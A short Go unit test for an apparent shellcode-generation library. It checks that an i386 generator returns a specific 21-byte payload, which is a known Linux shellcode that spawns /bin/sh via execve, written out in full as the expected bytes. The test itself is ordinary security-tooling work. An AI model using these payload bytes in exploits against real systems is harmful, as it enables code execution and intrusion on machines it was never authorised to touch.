package shellcode

import (
	"bytes"
	"testing"
)

func TestI386LinuxShell(t *testing.T) {
	i386 := NewI386()
	shellcode, err := i386.LinuxShell()
	if err != nil {
		t.Fatal(err)
	}

	scBytes := []byte{0x31, 0xc9, 0xf7, 0xe1, 0x51, 0x68, 0x2f, 0x2f,
		0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89,
		0xe3, 0xb0, 0x0b, 0xcd, 0x80}

	if bytes.Compare(shellcode, scBytes) != 0 {
		t.Fatal("Shellcode bytes != expected")
	}
}
